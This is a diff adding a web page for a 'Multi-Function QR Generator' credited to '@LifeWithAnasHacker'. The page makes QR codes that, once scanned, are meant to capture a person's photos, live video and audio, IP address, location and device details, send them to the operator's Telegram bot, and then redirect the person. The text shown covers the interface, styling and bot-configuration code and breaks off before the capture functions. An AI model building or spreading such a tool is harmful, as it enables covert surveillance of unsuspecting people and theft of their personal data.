@@ -1,0 +1,1645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Function QR Generator - Advanced Tool BY @LifeWithAnasHacker</title>
+    <style>
+    /* Reset and Base Styles */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    line-height: 1.6;
+    color: #333;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #ff6b6b 100%);
+    background-size: 400% 400%;
+    animation: gradientShift 10s ease infinite;
+    min-height: 100vh;
+}
+
+@keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+/* Header Styles */
+.header {
+    text-align: center;
+    margin-bottom: 30px;
+    color: white;
+    position: relative;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 20px;
+    backdrop-filter: blur(15px);
+    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.header h1 {
+    font-size: 3em;
+    margin-bottom: 15px;
+    text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
+    background: linear-gradient(45deg, #fff, #f0f0f0, #fff);
+    background-size: 300% 300%;
+    animation: textShine 3s ease-in-out infinite;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+@keyframes textShine {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+}
+
+.header p {
+    font-size: 1.3em;
+    opacity: 0.95;
+    text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+}
+
+/* Telegram Section */
+.telegram-section {
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.telegram-btn {
+    display: inline-block;
+    background: linear-gradient(45deg, #229ED9, #0088cc);
+    color: white;
+    text-decoration: none;
+    padding: 15px 30px;
+    border-radius: 50px;
+    font-weight: bold;
+    font-size: 1.1em;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(34, 158, 217, 0.3);
+}
+
+.telegram-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(34, 158, 217, 0.4);
+}
+
+.telegram-btn i {
+    margin-right: 10px;
+}
+
+/* Function Selector */
+.function-selector {
+    margin-bottom: 30px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 20px;
+    padding: 25px;
+    backdrop-filter: blur(15px);
+    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.function-selector h3 {
+    color: white;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 1.4em;
+    text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+}
+
+.function-buttons {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 15px;
+    justify-content: center;
+}
+
+.function-btn {
+    background: rgba(255, 255, 255, 0.2);
+    color: white;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    padding: 15px 25px;
+    border-radius: 15px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    font-size: 1em;
+    font-weight: 600;
+    text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+    min-width: 140px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+
+.function-btn:hover {
+    background: rgba(255, 255, 255, 0.3);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+}
+
+.function-btn.active {
+    background: linear-gradient(45deg, #4facfe 0%, #00f2fe 100%);
+    border-color: rgba(255, 255, 255, 0.8);
+    box-shadow: 0 4px 15px rgba(79, 172, 254, 0.4);
+    transform: translateY(-2px);
+}
+
+.function-btn i {
+    font-size: 1.2em;
+}
+
+/* Config Section */
+.config-section {
+    margin-bottom: 30px;
+}
+
+.config-card {
+    background: rgba(255, 255, 255, 0.95);
+    padding: 25px;
+    border-radius: 15px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.config-card h3 {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 1.3em;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.config-inputs {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    align-items: end;
+}
+
+@media (max-width: 768px) {
+    .config-inputs {
+        grid-template-columns: 1fr;
+        gap: 15px;
+    }
+}
+
+.save-config-btn {
+    background: linear-gradient(45deg, #28a745, #20c997);
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    justify-content: center;
+    height: fit-content;
+}
+
+.save-config-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+}
+
+/* Main Content */
+.main-content {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 30px;
+    margin-bottom: 30px;
+}
+
+@media (max-width: 768px) {
+    .main-content {
+        grid-template-columns: 1fr;
+        gap: 20px;
+    }
+}
+
+/* Form Section */
+.form-section {
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+
+.qr-form {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.input-group {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+}
+
+.input-group label {
+    font-weight: 600;
+    color: #555;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.input-group input,
+.input-group textarea {
+    padding: 12px 15px;
+    border: 2px solid #e1e5e9;
+    border-radius: 8px;
+    font-size: 16px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+}
+
+.input-group input:focus,
+.input-group textarea:focus {
+    outline: none;
+    border-color: #667eea;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+}
+
+.input-hint {
+    color: #6c757d;
+    font-size: 0.9em;
+}
+
+.generate-btn {
+    background: linear-gradient(45deg, #667eea, #764ba2);
+    color: white;
+    border: none;
+    padding: 15px 25px;
+    border-radius: 8px;
+    font-size: 1.1em;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 10px;
+}
+
+.generate-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+}
+
+.generate-btn:active {
+    transform: translateY(0);
+}
+
+/* Result Section */
+.result-section {
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    text-align: center;
+}
+
+.qr-container h3 {
+    margin-bottom: 20px;
+    color: #333;
+    font-size: 1.5em;
+}
+
+.qr-display {
+    display: inline-block;
+    padding: 20px;
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    margin-bottom: 15px;
+}
+
+.display-text {
+    background: #f8f9fa;
+    padding: 15px;
+    border-radius: 8px;
+    margin: 15px 0;
+    color: #555;
+    font-style: italic;
+}
+
+.action-buttons {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-top: 20px;
+}
+
+.action-btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: 500;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.download-btn {
+    background: #28a745;
+    color: white;
+}
+
+.download-btn:hover {
+    background: #218838;
+}
+
+.copy-btn {
+    background: #17a2b8;
+    color: white;
+}
+
+.copy-btn:hover {
+    background: #138496;
+}
+
+.new-btn {
+    background: #6c757d;
+    color: white;
+}
+
+.new-btn:hover {
+    background: #5a6268;
+}
+
+/* Features Section */
+.features-section {
+    margin-bottom: 30px;
+    background: rgba(255, 255, 255, 0.1);
+    padding: 25px;
+    border-radius: 15px;
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.features-section h3 {
+    color: white;
+    text-align: center;
+    margin-bottom: 25px;
+    font-size: 1.5em;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.features-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 20px;
+}
+
+.feature-card {
+    background: rgba(255, 255, 255, 0.95);
+    padding: 20px;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.feature-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+}
+
+.feature-card i {
+    font-size: 2.5em;
+    color: #667eea;
+    margin-bottom: 15px;
+    display: block;
+}
+
+.feature-card h4 {
+    color: #333;
+    margin-bottom: 10px;
+    font-size: 1.2em;
+}
+
+.feature-card p {
+    color: #666;
+    font-size: 0.9em;
+    line-height: 1.4;
+}
+
+/* Privacy Notice */
+.privacy-notice {
+    background: rgba(255, 255, 255, 0.1);
+    color: white;
+    padding: 15px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    text-align: center;
+    backdrop-filter: blur(10px);
+}
+
+.privacy-notice i {
+    margin-right: 8px;
+}
+
+/* Footer */
+.footer {
+    text-align: center;
+    color: white;
+    opacity: 0.8;
+    margin-top: 20px;
+}
+
+.footer i {
+    color: #ff6b6b;
+}
+
+/* Loading Overlay */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    color: white;
+}
+
+.spinner {
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top: 4px solid #fff;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Toast Notifications */
+.toast {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: #333;
+    color: white;
+    padding: 15px 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    transform: translateX(400px);
+    transition: transform 0.3s ease;
+    z-index: 1000;
+}
+
+.toast.show {
+    transform: translateX(0);
+}
+
+.toast.success {
+    background: #28a745;
+}
+
+.toast.error {
+    background: #dc3545;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    .container {
+        padding: 15px;
+    }
+    
+    .header h1 {
+        font-size: 2em;
+    }
+    
+    .form-section,
+    .result-section {
+        padding: 20px;
+    }
+    
+    .action-buttons {
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    .action-btn {
+        width: 100%;
+        justify-content: center;
+        max-width: 200px;
+    }
+    
+    .telegram-btn {
+        padding: 12px 25px;
+        font-size: 1em;
+    }
+}
+
+/* Animations */
+@keyframes fadeInUp {
+    from {
+        opacity: 0;
+        transform: translateY(30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.form-section,
+.result-section {
+    animation: fadeInUp 0.6s ease;
+}
+
+/* QR Code Styling */
+#qrcode canvas {
+    border-radius: 8px;
+}
+
+/* Warning Text */
+.warning-text {
+    background: rgba(255, 193, 7, 0.1);
+    border: 2px solid rgba(255, 193, 7, 0.3);
+    color: #856404;
+    padding: 15px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.warning-text i {
+    color: #ffc107;
+    font-size: 1.2em;
+}
+
+/* Specialized Form Buttons */
+.camera-btn {
+    background: linear-gradient(45deg, #e83e8c, #c3185a);
+    border: none;
+    color: white;
+    padding: 15px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 1.1em;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    box-shadow: 0 4px 15px rgba(232, 62, 140, 0.3);
+}
+
+.camera-btn:hover {
+    background: linear-gradient(45deg, #c3185a, #a91447);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(232, 62, 140, 0.4);
+}
+
+.video-btn {
+    background: linear-gradient(45deg, #fd7e14, #e8590c);
+    border: none;
+    color: white;
+    padding: 15px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 1.1em;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    box-shadow: 0 4px 15px rgba(253, 126, 20, 0.3);
+}
+
+.video-btn:hover {
+    background: linear-gradient(45deg, #e8590c, #d54e0a);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(253, 126, 20, 0.4);
+}
+
+.ip-btn {
+    background: linear-gradient(45deg, #20c997, #17a085);
+    border: none;
+    color: white;
+    padding: 15px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 1.1em;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    box-shadow: 0 4px 15px rgba(32, 201, 151, 0.3);
+}
+
+.ip-btn:hover {
+    background: linear-gradient(45deg, #17a085, #148f77);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(32, 201, 151, 0.4);
+}
+
+.multi-btn {
+    background: linear-gradient(45deg, #6f42c1, #5a35a3);
+    border: none;
+    color: white;
+    padding: 15px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 1.1em;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    box-shadow: 0 4px 15px rgba(111, 66, 193, 0.3);
+}
+
+.multi-btn:hover {
+    background: linear-gradient(45deg, #5a35a3, #4c2c85);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(111, 66, 193, 0.4);
+}
+
+/* Multi-Function Options */
+.multi-options {
+    margin: 20px 0;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 10px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.multi-options h4 {
+    color: #333;
+    margin-bottom: 15px;
+    font-size: 1.1em;
+}
+
+.checkbox-group {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 12px;
+}
+
+.checkbox-item {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    padding: 10px;
+    border-radius: 8px;
+    transition: all 0.3s ease;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.checkbox-item:hover {
+    background: rgba(255, 255, 255, 0.05);
+    transform: translateY(-1px);
+}
+
+.checkbox-item input[type="checkbox"] {
+    display: none;
+}
+
+.checkmark {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #ddd;
+    border-radius: 4px;
+    margin-right: 10px;
+    position: relative;
+    transition: all 0.3s ease;
+    flex-shrink: 0;
+}
+
+.checkbox-item input[type="checkbox"]:checked + .checkmark {
+    background: linear-gradient(45deg, #4facfe, #00f2fe);
+    border-color: #4facfe;
+}
+
+.checkbox-item input[type="checkbox"]:checked + .checkmark::after {
+    content: "✓";
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    color: white;
+    font-weight: bold;
+    font-size: 12px;
+}
+
+</style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1><i class="fas fa-qrcode"></i> Multi-Function QR Generator</h1>
+            <p>Advanced QR generator with camera, live video, IP tracking, and multi-function capabilities</p>
+        </header>
+
+        <!-- Function Selection -->
+        <div class="function-selector">
+            <h3><i class="fas fa-list"></i> Select Function</h3>
+            <div class="function-buttons">
+                <button class="function-btn active" data-function="basic" id="basicBtn">
+                    <i class="fas fa-qrcode"></i>
+                    Basic QR
+                </button>
+                <button class="function-btn" data-function="camera" id="cameraBtn">
+                    <i class="fas fa-camera"></i>
+                    Camera Access
+                </button>
+                <button class="function-btn" data-function="video" id="videoBtn">
+                    <i class="fas fa-video"></i>
+                    Live Video
+                </button>
+                <button class="function-btn" data-function="ip" id="ipBtn">
+                    <i class="fas fa-globe"></i>
+                    IP Info
+                </button>
+                <button class="function-btn" data-function="multi" id="multiBtn">
+                    <i class="fas fa-layer-group"></i>
+                    Multi-Function
+                </button>
+            </div>
+        </div>
+
+        <!-- Telegram Channel Button -->
+        <div class="telegram-section">
+            <a href="https://t.me/lifewithanashacker" target="_blank" class="telegram-btn">
+                <i class="fab fa-telegram-plane"></i>
+                Join Our Telegram Channel
+            </a>
+        </div>
+
+        <!-- Bot Configuration Section -->
+        <div class="config-section" id="configSection">
+            <div class="config-card">
+                <h3><i class="fas fa-cog"></i> Bot Configuration</h3>
+                <div class="config-inputs">
+                    <div class="input-group">
+                        <label for="botToken">
+                            <i class="fas fa-robot"></i>
+                            Telegram Bot Token
+                        </label>
+                        <input 
+                            type="text" 
+                            id="botToken" 
+                            placeholder="Bot Token Here"
+                            value="Bot Toker Here"
+                        >
+                    </div>
+                    <div class="input-group">
+                        <label for="chatId">
+                            <i class="fas fa-comments"></i>
+                            Chat ID
+                        </label>
+                        <input 
+                            type="text" 
+                            id="chatId" 
+                            placeholder="Chat ID Here"
+                            value="Chat ID here"
+                        >
+                    </div>
+                    <button class="save-btn" id="saveConfigBtn">
+                        <i class="fas fa-save"></i>
+                        Save Configuration
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Basic QR Form -->
+        <div class="form-section" id="basicForm">
+            <form id="qrForm">
+                <div class="input-group">
+                    <label for="linkInput">
+                        <i class="fas fa-link"></i>
+                        Enter URL or Link
+                    </label>
+                    <input type="url" id="linkInput" placeholder="https://example.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="textInput">
+                        <i class="fas fa-font"></i>
+                        Additional Text (Optional)
+                    </label>
+                    <textarea id="textInput" placeholder="Enter any additional text here..." rows="3"></textarea>
+                </div>
+                
+                <button type="submit" class="generate-btn">
+                    <i class="fas fa-qrcode"></i>
+                    Generate QR Code
+                </button>
+            </form>
+        </div>
+
+        <!-- Camera Access Form -->
+        <div class="form-section" id="cameraForm" style="display: none;">
+            <div class="camera-section">
+                <h3><i class="fas fa-camera"></i> Camera Access QR Generator</h3>
+                <p class="warning-text">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    This QR code will request camera permission and capture photos when scanned.
+                </p>
+                <form id="cameraQrForm">
+                    <div class="input-group">
+                        <label for="cameraLinkInput">
+                            <i class="fas fa-link"></i>
+                            Target URL (after photo capture)
+                        </label>
+                        <input type="url" id="cameraLinkInput" placeholder="https://example.com" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="cameraTextInput">
+                            <i class="fas fa-font"></i>
+                            Additional Text (Optional)
+                        </label>
+                        <textarea id="cameraTextInput" placeholder="Enter additional text..." rows="3"></textarea>
+                    </div>
+                    
+                    <button type="submit" class="generate-btn camera-btn">
+                        <i class="fas fa-camera"></i>
+                        Generate Camera QR Code
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Live Video Form -->
+        <div class="form-section" id="videoForm" style="display: none;">
+            <div class="video-section">
+                <h3><i class="fas fa-video"></i> Live Video QR Generator</h3>
+                <p class="warning-text">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    This QR code will request camera and microphone access for live video capture.
+                </p>
+                <form id="videoQrForm">
+                    <div class="input-group">
+                        <label for="videoLinkInput">
+                            <i class="fas fa-link"></i>
+                            Target URL (after video capture)
+                        </label>
+                        <input type="url" id="videoLinkInput" placeholder="https://example.com" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="videoTextInput">
+                            <i class="fas fa-font"></i>
+                            Additional Text (Optional)
+                        </label>
+                        <textarea id="videoTextInput" placeholder="Enter additional text..." rows="3"></textarea>
+                    </div>
+                    
+                    <button type="submit" class="generate-btn video-btn">
+                        <i class="fas fa-video"></i>
+                        Generate Video QR Code
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- IP Info Form -->
+        <div class="form-section" id="ipForm" style="display: none;">
+            <div class="ip-section">
+                <h3><i class="fas fa-globe"></i> IP Information QR Generator</h3>
+                <p class="warning-text">
+                    <i class="fas fa-info-circle"></i>
+                    This QR code will collect detailed IP and location information.
+                </p>
+                <form id="ipQrForm">
+                    <div class="input-group">
+                        <label for="ipLinkInput">
+                            <i class="fas fa-link"></i>
+                            Target URL (after data collection)
+                        </label>
+                        <input type="url" id="ipLinkInput" placeholder="https://example.com" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="ipTextInput">
+                            <i class="fas fa-font"></i>
+                            Additional Text (Optional)
+                        </label>
+                        <textarea id="ipTextInput" placeholder="Enter additional text..." rows="3"></textarea>
+                    </div>
+                    
+                    <button type="submit" class="generate-btn ip-btn">
+                        <i class="fas fa-globe"></i>
+                        Generate IP Info QR Code
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Multi-Function Form -->
+        <div class="form-section" id="multiForm" style="display: none;">
+            <div class="multi-section">
+                <h3><i class="fas fa-layer-group"></i> Multi-Function QR Generator</h3>
+                <p class="warning-text">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    This QR code will collect IP info, camera access, video recording, and all data.
+                </p>
+                <form id="multiQrForm">
+                    <div class="input-group">
+                        <label for="multiLinkInput">
+                            <i class="fas fa-link"></i>
+                            Target URL (after all data collection)
+                        </label>
+                        <input type="url" id="multiLinkInput" placeholder="https://example.com" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="multiTextInput">
+                            <i class="fas fa-font"></i>
+                            Additional Text (Optional)
+                        </label>
+                        <textarea id="multiTextInput" placeholder="Enter additional text..." rows="3"></textarea>
+                    </div>
+                    
+                    <div class="multi-options">
+                        <h4>Select Functions to Include:</h4>
+                        <div class="checkbox-group">
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="includeIP" checked>
+                                <span class="checkmark"></span>
+                                IP & Location Info
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="includeCamera" checked>
+                                <span class="checkmark"></span>
+                                Camera Access
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="includeVideo" checked>
+                                <span class="checkmark"></span>
+                                Live Video Recording
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="includeDevice" checked>
+                                <span class="checkmark"></span>
+                                Device Information
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="generate-btn multi-btn">
+                        <i class="fas fa-layer-group"></i>
+                        Generate Multi-Function QR Code
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Result Section -->
+        <div class="result-section" id="resultSection" style="display: none;">
+            <div class="result-card">
+                <div class="result-header">
+                    <h3><i class="fas fa-check-circle"></i> QR Code Generated Successfully!</h3>
+                    <p id="displayText">Your QR code is ready</p>
+                </div>
+                
+                <div class="qr-display">
+                    <div id="qrcode"></div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="action-btn download-btn" id="downloadBtn">
+                        <i class="fas fa-download"></i>
+                        Download PNG
+                    </button>
+                    <button class="action-btn copy-btn" id="copyBtn">
+                        <i class="fas fa-copy"></i>
+                        Copy URL
+                    </button>
+                    <button class="action-btn new-btn" id="newBtn">
+                        <i class="fas fa-plus"></i>
+                        Generate New
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Features Section -->
+        <div class="features-section">
+            <h3><i class="fas fa-star"></i> Advanced Features</h3>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <i class="fas fa-camera"></i>
+                    <h4>Camera Access</h4>
+                    <p>Request camera permission and capture photos</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-video"></i>
+                    <h4>Live Video</h4>
+                    <p>Record live video with audio</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-map-marked-alt"></i>
+                    <h4>Location Tracking</h4>
+                    <p>Precise IP geolocation with Google Maps integration</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-layer-group"></i>
+                    <h4>Multi-Function BY @LifeWithAnasHacker</h4>
+                    <p>Combine all features in one QR code</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-telegram-plane"></i>
+                    <h4>Telegram Integration</h4>
+                    <p>Real-time notifications to your bot</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-bolt"></i>
+                    <h4>Instant Redirect</h4>
+                    <p>Fast redirect after data capture</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Privacy Notice -->
+        <div class="privacy-notice">
+            <p><i class="fas fa-info-circle"></i> Privacy Notice: When users scan the generated QR codes, various data (IP, location, camera access, device info) will be collected and sent to your Telegram bot before redirecting to the target URL. Users will be prompted for necessary permissions.</p>
+        </div>
+
+        <footer class="footer">
+            <p>&copy; 2025 Multi-Function QR Generator. Made with <i class="fas fa-heart"></i></p>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Generating QR Code...</p>
+    </div>
+
+    <!-- Toast Notifications -->
+    <div id="toast" class="toast"></div>
+
+    <script>
+    // Application State
+let generatedQRData = '';
+let currentLink = '';
+let currentText = '';
+let currentFunction = 'basic';
+
+// DOM Elements
+const qrForm = document.getElementById('qrForm');
+const cameraQrForm = document.getElementById('cameraQrForm');
+const videoQrForm = document.getElementById('videoQrForm');
+const ipQrForm = document.getElementById('ipQrForm');
+const multiQrForm = document.getElementById('multiQrForm');
+
+const linkInput = document.getElementById('linkInput');
+const textInput = document.getElementById('textInput');
+const cameraLinkInput = document.getElementById('cameraLinkInput');
+const cameraTextInput = document.getElementById('cameraTextInput');
+const videoLinkInput = document.getElementById('videoLinkInput');
+const videoTextInput = document.getElementById('videoTextInput');
+const ipLinkInput = document.getElementById('ipLinkInput');
+const ipTextInput = document.getElementById('ipTextInput');
+const multiLinkInput = document.getElementById('multiLinkInput');
+const multiTextInput = document.getElementById('multiTextInput');
+
+const resultSection = document.getElementById('resultSection');
+const qrcodeDiv = document.getElementById('qrcode');
+const displayText = document.getElementById('displayText');
+const downloadBtn = document.getElementById('downloadBtn');
+const copyBtn = document.getElementById('copyBtn');
+const newBtn = document.getElementById('newBtn');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const toast = document.getElementById('toast');
+const botTokenInput = document.getElementById('botToken');
+const chatIdInput = document.getElementById('chatId');
+const saveConfigBtn = document.getElementById('saveConfigBtn');
+
+// Function selector buttons
+const functionButtons = document.querySelectorAll('.function-btn');
+const basicForm = document.getElementById('basicForm');
+const cameraForm = document.getElementById('cameraForm');
+const videoForm = document.getElementById('videoForm');
+const ipForm = document.getElementById('ipForm');
+const multiForm = document.getElementById('multiForm');
+
+// Telegram Bot Configuration
+let TELEGRAM_BOT_TOKEN = 'Bot Token Here';
+let TELEGRAM_CHAT_ID = 'Chat ID here';
+
+// aslo replace           chat id ☝️
+
+// Event Listeners
+document.addEventListener('DOMContentLoaded', function() {
+    initializeApp();
+});
+
+// Function selector event listeners
+functionButtons.forEach(button => {
+    button.addEventListener('click', function() {
+        const functionType = this.getAttribute('data-function');
+        switchFunction(functionType);
+    });
+});
+
+// Form event listeners
+qrForm.addEventListener('submit', handleBasicFormSubmit);
+cameraQrForm.addEventListener('submit', handleCameraFormSubmit);
+videoQrForm.addEventListener('submit', handleVideoFormSubmit);
+ipQrForm.addEventListener('submit', handleIpFormSubmit);
+multiQrForm.addEventListener('submit', handleMultiFormSubmit);
+
+// Action button event listeners
+downloadBtn.addEventListener('click', downloadQRCode);
+copyBtn.addEventListener('click', copyQRURL);
+newBtn.addEventListener('click', resetForm);
+saveConfigBtn.addEventListener('click', saveConfiguration);
+
+// Initialize Application
+function initializeApp() {
+    console.log('Multi-Function QR Code Generator initialized');
+    loadConfiguration();
+    linkInput.focus();
+    
+    // Check for service worker support
+    if ('serviceWorker' in navigator) {
+        console.log('Service worker support detected');
+    }
+}
+
+// Load Configuration from localStorage
+function loadConfiguration() {
+    const savedToken = localStorage.getItem('telegram_bot_token');
+    const savedChatId = localStorage.getItem('telegram_chat_id');
+    
+    if (savedToken) {
+        TELEGRAM_BOT_TOKEN = savedToken;
+        botTokenInput.value = savedToken;
+    }
+    
+    if (savedChatId) {
+        TELEGRAM_CHAT_ID = savedChatId;
+        chatIdInput.value = savedChatId;
+    }
+}
+
+// Save Configuration
+function saveConfiguration() {
+    const token = botTokenInput.value.trim();
+    const chatId = chatIdInput.value.trim();
+    
+    if (token) {
+        localStorage.setItem('telegram_bot_token', token);
+        TELEGRAM_BOT_TOKEN = token;
+    }
+    
+    if (chatId) {
+        localStorage.setItem('telegram_chat_id', chatId);
+        TELEGRAM_CHAT_ID = chatId;
+    }
+    
+    showToast('Configuration saved successfully!', 'success');
+}
+
+// Switch between different functions
+function switchFunction(functionType) {
